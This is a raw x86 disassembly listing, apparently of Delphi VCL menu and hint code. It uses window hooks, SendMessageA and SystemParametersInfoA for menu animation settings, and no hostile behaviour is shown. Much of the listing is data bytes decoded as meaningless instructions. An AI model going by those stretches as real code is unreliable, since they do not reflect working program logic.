add [ edx ] bh
jne r-xdata
add [ eax + esi * 8 - 0x39a3ffbc ] ch
inc esp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + esi * 2 ] al
inc edi
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ ebx + edi * 2 + 0x47 ] dh
je r-xdata
xchg esp eax
pop ebx
inc edi
outsb
hlt
sub_472c88
rcl [ esi ] 0x48
add ah dl
push edx
inc edi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax + 0x5400452f ] ch
sbb al 0x48
add [ edi + ebp - 0xedbffbb ] cl
inc esp
add [ edx + edi * 8 + 0x5580047 ] ah
inc ebp
add [ edi + edi * 8 + 0x44 ] al
add [ eax + 0x2 ] al
inc ebp
add [ eax ] dh
inc ebp
add [ eax - 0x2 ] bh
inc edi
add [ ecx + eax * 4 + 0x47 ] dl
add [ esp + eax + 0x4540045 ] ch
inc ebp
add ah cl
xor [ ebp ] al
sub al 0x10
dec eax
add al al
inc edx
inc ebp
add [ eax + 0x2d ] cl
inc ebp
add [ eax ] bh
xor [ ebp ] al
inc eax
push ds
dec eax
add al dl
cli
inc edi
add [ ebx + edi * 8 + 0x78b00047 ] dh
inc edi
add al bl
add [ edi ] sub_4807dc
push eax
adc eax 0x14a00048
dec eax
add al dh
sbb cl [ eax ]
nop
or [ eax ] ecx
or [ 0xd940048 ] cl
dec eax
add [ esi + ecx + 0x48 ] al
add [ edi + edx ] al
dec eax
add [ edi + edx + 0x46b00048 ] dh
inc edi
add [ eax ] dl
push cs
dec eax
add [ eax - 0x43ffb7e3 ] bh
push cs
dec eax
add [ eax + 0xf ] cl
dec eax
add [ eax + 0x4 ] ch
dec eax
add [ eax + edx ] al
dec eax
add al bh
sbb [ eax ] cl
fcom [ eax ]
dec eax
add [ eax + 0x3c00481a ] bh
sbb eax 0x7af80048
inc edi
add [ eax + 0x38004813 ] ch
push ecx
inc edi
add [ esp + edx ] bh
dec eax
add [ eax + ecx + 0x5bc00048 ] bh
inc edi
add [ ebx + ebx * 2 + 0x47 ] dh
add [ eax + 0x3d ] bl
inc edi
add [ eax ] dl
inc ecx
inc edi
add [ eax + 0x48004742 ] ch
jns r-xdata
adc al [ ecx ]
add al 0x1
add eax 0x34ffb801
jpo r-xdata
add [ ebp + eax * 2 + 0x47 ] dl
add [ eax + eax * 2 + 0x45740047 ] cl
inc edi
add [ eax + 0x34004747 ] bl
dec eax
inc edi
add [ ebx + edi * 2 + 0x47 ] dl
add [ eax + 0x4b ] al
inc edi
add [ edx + edi * 2 + 0x47 ] ah
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
add al ch
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2f ] dh
inc edi
add [ edi + ebp + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi ] 0x47
add [ eax - 0x33ffb8d1 ] ch
add [ eax ] eax
add al dl
mov al 0x47
sub al 0x47
add [ esp + 0x47 ] dl
add [ ebx ] cl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
imul ebp [ edi + 0x6e ] 0x6e69614d
dec ebp
outsb
jne r-xdata
add al cl
jpe r-xdata
adc eax [ edx ]
in al dx
push ss
inc edx
add al cl
add [ edi ] 0x48
fadd [ eax + eax + 0x44 ]
fadd [ eax + eax + 0x14 ]
fld [ eax + eax - 0x64 ]
inc eax
dec eax
add ah bh
retn 0x44
add [ eax ] al
sub [ esi ] 0x47
add ah cl
push ss
inc edi
popad
jb r-xdata
popad
imul ebp [ esi + 0x4d ] 0x42756e65
add [ eax + 0x77 ] bl
inc edi
add [ edx + edi * 2 ] bh
inc edi
add [ edx + eax * 4 ] al
inc edi
add al bh
outsb
jne r-xdata
outsb
dec ebp
add [ eax ] bl
push esp
inc ebx
jne r-xdata
je r-xdata
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x7c ] dh
inc edi
shl [ eax + 0x16cc0047 ] 0x1
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x42756e65
popad
jb r-xdata
jpe r-xdata
add al 0x2e
inc edi
add [ edi ] al
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ edi ] 0xc
add [ edi ] 0xffffffac
js r-xdata
clc
add [ edi + esi * 2 + 0x47 ] al
add [ eax - 0x7d ] dh
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3100040 ] dl
add [ eax ] al
or [ eax ] eax
or al 0xb0
0xb025ff 0x8401
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
outsd
sub_472db9
add [ edx ] dl
add [ ecx + eax ] eax
add eax 0x34ffb801
jpo r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
add al ch
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2f ] dh
inc edi
add [ edi + ebp + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi ] 0x47
add [ eax - 0x33ffb8d1 ] ch
add [ eax ] eax
add al dl
mov al 0x47
sub al 0x47
add [ esp + 0x47 ] dl
add [ ebx ] cl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
imul ebp [ edi + 0x6e ] 0x6e69614d
dec ebp
outsb
jne r-xdata
add al cl
jpe r-xdata
adc eax [ edx ]
in al dx
push ss
inc edx
add al cl
add [ edi ] 0x48
fadd [ eax + eax + 0x44 ]
fadd [ eax + eax + 0x14 ]
fld [ eax + eax - 0x64 ]
inc eax
dec eax
add ah bh
retn 0x44
add [ eax ] al
sub [ esi ] 0x47
add ah cl
push ss
inc edi
popad
jb r-xdata
popad
imul ebp [ esi + 0x4d ] 0x42756e65
add [ eax + 0x77 ] bl
inc edi
add [ edx + edi * 2 ] bh
inc edi
add [ edx + eax * 4 ] al
inc edi
add al bh
outsb
jne r-xdata
outsb
dec ebp
add [ eax ] bl
push esp
inc ebx
jne r-xdata
je r-xdata
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x7c ] dh
inc edi
shl [ eax + 0x16cc0047 ] 0x1
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x42756e65
popad
jb r-xdata
jpe r-xdata
add al 0x2e
inc edi
add [ edi ] al
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ edi ] 0xc
add [ edi ] 0xffffffac
js r-xdata
clc
add [ edi + esi * 2 + 0x47 ] al
add [ eax - 0x7d ] dh
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3100040 ] dl
add [ eax ] al
or [ eax ] eax
or al 0xb0
0xb025ff 0x8401
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
outsd
sub_472ec8
mov bl cl
inc esp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_472ef0
or cl cl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + eax * 2 - 0x32b7ffb8 ] dh
inc esp
add ah dh
int 0x44
add [ eax ] cl
mov esi 0xcdd40044
inc esp
add [ eax + 0x60004785 ] ch
mov [ edi ] es
in al dx
mov es [ edi ]
hlt
sub_472fe8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
xor [ edi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ecx ] dh
inc edi
add [ ecx + esi + 0x47 ] al
add [ ecx + eax + 0xa80000 ] dh
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al ch
xchg ecx eax
inc edi
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
dec esp
push cs
inc edi
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ecx + edx * 4 - 0x27b7ffb9 ] ch
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_4730a0
or cl cl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + eax * 2 - 0x32b7ffb8 ] dh
inc esp
add ah dh
int 0x44
add [ edx + edx ] ah
inc edi
add ah dl
int 0x44
add [ edi + edx * 4 ] cl
inc edi
add al ah
daa
dec eax
add [ ebx + edx * 4 + 0x47 ] bh
add ah dh
aas
dec eax
add [ eax + 0xe ] cl
inc edi
add al cl
cmp ecx [ eax ]
mov [ eax + ecx * 2 ] gs
add al cl
adc al [ edi ]
loopne r-xdata
add ah dh
aaa
dec eax
add [ eax + 0x40 ] ah
dec eax
add ah cl
xor ecx [ eax ]
loopne r-xdata
inc edi
add al al
xchg esp eax
inc edi
add ah dh
xor cl [ eax ]
pop eax
xor [ eax ] cl
hlt
xchg esi eax
inc edi
add al al
xchg esi eax
inc edi
add [ eax - 0x6e ] bl
inc edi
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
dec eax
add [ edi + esi + 0x111c0048 ] ch
inc edi
add [ eax - 0x23ffb8ee ] dh
adc [ edi ] eax
mov al [ 0xffffffffec00470c ]
xchg ebp eax
inc edi
add [ esi + ecx + 0x47 ] al
add [ edi ] al
add [ esi ] al
mov al 0xed
or al 0x10
je r-xdata
inc edx
add [ esi - 0x2327ffc0 ] al
inc eax
insd
dec ebp
outsb
jne r-xdata
add [ eax + edx ] cl
add [ eax ] al
add [ eax ] al
add al ch
xor al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esi [ edx ]
inc edi
add ah cl
xor al [ edi ]
jne r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x7c ] dh
inc edi
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
je r-xdata
inc esp
fcomp st4
outsb
mov eax eax
pop esp
xor [ edi ] eax
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
pop [ ecx ]
add [ eax + 0x240044dd ] dh
outsd
insd
dec ebp
outsb
jne r-xdata
rol [ ecx ] 0x1
add [ eax ] al
xor al 0x2e
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
jne r-xdata
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
je r-xdata
outsb
xor [ eax ] dh
inc edi
add [ eax ] dh
add al [ edi ]
or eax [ eax ]
or [ ecx + 0x63 ] eax
je r-xdata
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
pop esp
mov [ eax + eax - 0x1c ] 0x16
dec ebp
outsb
jne r-xdata
push ss
inc edx
add al cl
add [ edi ] 0x48
fadd [ eax + eax + 0x44 ]
fadd [ eax + eax + 0x14 ]
fld [ eax + eax - 0x64 ]
inc eax
dec eax
add ah bh
retn 0x44
inc edx
add [ eax - 0x13ffbded ] dh
add [ eax ] al
lea eax [ eax ]
aam 0x31
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_473128
cmp al 0x97
inc edi
add [ eax ] bh
xchg edx eax
inc edi
add ah dh
xchg ebx eax
inc edi
add [ eax ] cl
xchg ebx eax
inc edi
add [ esi + edx * 4 ] al
inc edi
add al al
xchg esi eax
inc edi
add [ eax - 0x6e ] bl
inc edi
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
or al 0x10
je r-xdata
inc edx
add [ esi - 0x2327ffc0 ] al
inc eax
insd
dec ebp
outsb
jne r-xdata
add [ eax + edx ] cl
add [ eax ] al
add [ eax ] al
add al ch
xor al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esi [ edx ]
inc edi
add ah cl
xor al [ edi ]
jne r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x7c ] dh
inc edi
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
je r-xdata
inc esp
fcomp st4
outsb
mov eax eax
pop esp
xor [ edi ] eax
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
pop [ ecx ]
add [ eax + 0x240044dd ] dh
outsd
insd
dec ebp
outsb
jne r-xdata
rol [ ecx ] 0x1
add [ eax ] al
xor al 0x2e
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
jne r-xdata
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
je r-xdata
outsb
xor [ eax ] dh
inc edi
add [ eax ] dh
add al [ edi ]
or eax [ eax ]
or [ ecx + 0x63 ] eax
je r-xdata
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
pop esp
mov [ eax + eax - 0x1c ] 0x16
dec ebp
outsb
jne r-xdata
push ss
inc edx
add al cl
add [ edi ] 0x48
fadd [ eax + eax + 0x44 ]
fadd [ eax + eax + 0x14 ]
fld [ eax + eax - 0x64 ]
inc eax
dec eax
add ah bh
retn 0x44
inc edx
add [ eax - 0x13ffbded ] dh
add [ eax ] al
lea eax [ eax ]
aam 0x31
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_47321c
mov bl cl
inc esp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add [ eax ] al
outsd
inc edi
add [ eax - 0x39 ] cl
inc esp
add [ edx + ecx * 8 + 0x44 ] bl
add [ eax ] cl
leave
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + eax * 2 - 0x32b7ffb8 ] dh
inc esp
add ah dh
int 0x44
add [ eax ] cl
mov esi 0xcdd40044
inc esp
add [ eax + 0x60004785 ] ch
mov [ edi ] es
in al dx
mov es [ edi ]
hlt
sub_473314
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_42c35c
mov [ edi + 0x8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_473370
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
mov [ esp ] eax
mov eax [ ebx + 0x8 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x210 ]
test eax eax
je r-xdata
mov eax esp
call sub_40d4f0
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
xor edx edx
mov [ eax + 0x18 ] edx
mov eax [ esp ]
xor edx edx
mov [ eax + 0x2fc ] edx
xor edx edx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov eax ebx
call sub_42c354
dec eax
jne r-xdata
mov eax esp
call sub_40d4f0
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax ebx
call sub_473364
add eax 0x2f8
push eax
mov eax [ esp + 0x4 ]
mov edx [ r-xdata ]
call sub_403458
pop edx
mov [ edx ] eax
jmp r-xdata
sub_473410
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x10004734
add [ eax ] al
add [ eax ] bh
pushad
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x79 ] bl
inc ecx
add ah bh
mov [ ecx ] al
cld
inc edi
add [ edi + eax * 4 - 0x77d7ffbf ] ch
inc ecx
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
add [ ebp + esi + 0x47 ] bl
add [ ebx + edx * 4 + 0x12c00045 ] bh
inc edx
add [ edi + ecx * 4 ] ah
inc ecx
add [ eax - 0x47ffbded ] bl
popad
inc esp
add [ esp + ecx * 4 - 0x6667ffbb ] cl
inc ebp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax ] ch
bound eax [ eax + eax - 0x38 ]
sbb [ edx ] eax
insb
sbb [ edx ] eax
sbb al 0x36
inc edi
add [ eax ] ah
inc edi
add [ eax - 0x1fffb8cb ] dl
lea eax [ ebp ]
rcl [ edi - 0x68a7ffbb ] 0x45
add ah ch
0x61600045 0x44
adc dl [ ecx + ecx * 2 + 0x6e ]
je r-xdata
imul esi [ ebx + 0x74 ] 0x34c0c08b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
xor eax 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ 0xb40047 ] dh
add [ eax ] al
dec eax
pushad
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
fstp [ esi + 0x7 ]
jb r-xdata
pop ebx
retn
popad
insb
dec ebp
inc esp
dec ecx
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
nop
xor [ 0x12070047 ] dh
push esp
dec ecx
outsb
je r-xdata
or al 0x74
dec al
je r-xdata
jb r-xdata
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4530b8
push eax
push 0x223
mov eax [ ebx + 0xa0 ]
call sub_4530b8
push eax
call GetParent
push eax
call SendMessageA
pop ebx
retn
dec al
je r-xdata
jmp r-xdata
popad
insb
dec ebp
inc esp
dec ecx
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
shl [ edi + eax * 2 ] 0x0
cld
pushad
inc esp
add [ ebx ] dl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
outsb
jne r-xdata
mov eax [ ebx + 0xa0 ]
call sub_4698a0
pop ebx
retn
stc
call [ eax - 0x18 ]
lea esi [ 0xffffffffc35bfff9 ]
mov eax [ ebx + 0xa0 ]
call sub_4698a0
pop ebx
retn
add [ eax ] al
mov eax eax
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0xa8 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45936c
test bl bl
jle r-xdata
call sub_4032a8
pop esi
mov eax esi
call sub_40365c
sub_473628
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x8 ]
sub eax 0x6
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub eax 0x14
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x17c ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
jmp r-xdata
call [ rw-data ]
sub_473690
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ rw-data ] eax
pop ebx
retn
mov edx ebx
mov eax [ rw-data ]
call sub_418930
inc eax
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_418778
sub_4736fc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test bl bl
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp [ esi + 0x8 ] 0x1
jne r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418b78
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x8 ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_473628
push eax
push 0x4
call SetWindowsHookExA
mov [ rw-data ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
xor eax eax
mov [ rw-data ] eax
sub_473760
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_471e94
mov [ esi + 0x289 ] 0x1
xor edx edx
mov eax esi
call sub_42f240
mov [ esi + 0x2c0 ] 0xfa0
mov [ esi + 0x2c8 ] 0x1
mov [ esi + 0x288 ] 0x1
mov eax esi
call sub_473690
mov [ esi + 0x2d8 ] 0x96
mov [ esi + 0x2f0 ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ esi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4737ec
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_4736d0
mov eax [ esi + 0x2a8 ]
test eax eax
je r-xdata
lea eax [ esi + 0x2f8 ]
call sub_40d4f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47fa60
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x2fc ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_473838
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
push eax
push 0x0
push 0x1002
call SystemParametersInfoA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x2a8 ]
cmp [ eax + 0x288 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
push eax
push 0x0
push 0x1012
call SystemParametersInfoA
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax + 0x2ac ]
mov eax ebx
call sub_44c214
lea edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x30 ]
call sub_44c38c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0x11 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0xd ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x44 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xd ]
sub edx 0x5
cmp eax edx
setl al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
movzx edx [ edx - 0x9 ]
or eax [ edx * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x2d8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4530b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x9 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x80000
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x2d8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4530b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
sub_473978
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
add edi 0xfffffff8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x2a8 ]
cmp [ eax + 0x288 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x18 ]
mov eax [ edi ]
mov ebx [ eax + 0x2ac ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41725c
lea edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
mov eax ebx
call sub_44c38c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax - 0x11 ] edx
mov edx [ ebp - 0xc ]
mov [ eax - 0xd ] edx
mov eax [ edi ]
cmp [ eax + 0x289 ] 0x3
jne r-xdata
mov eax [ edi ]
mov ebx [ eax + 0x2ac ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_44c214
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_44c38c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax - 0x11 ] edx
mov edx [ ebp - 0xc ]
mov [ eax - 0xd ] edx
mov edx [ ebx + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x2ac ]
mov esi [ eax + 0x30 ]
add edx [ esi + 0x44 ]
mov eax [ ebx + 0x40 ]
add eax [ esi + 0x40 ]
lea ecx [ ebp - 0x10 ]
call sub_41725c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax - 0x11 ] edx
mov edx [ ebp - 0xc ]
mov [ eax - 0xd ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xd ]
mov edx [ edi ]
mov edx [ edx + 0x44 ]
add edx 0x2
cmp eax edx
setg al
and eax 0x7f
mov eax [ ebp + eax * 4 - 0x8 ]
mov edx [ ebp + 0x8 ]
movzx edx [ edx - 0x9 ]
or eax [ edx * 4 + rw-data ]
push eax
mov eax [ edi ]
mov eax [ eax + 0x2d8 ]
push eax
mov eax [ edi ]
call sub_4530b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_473abc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x9 ] dl
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c4 ]
cmp [ eax + 0x297 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x289 ]
dec al
je r-xdata
push ebp
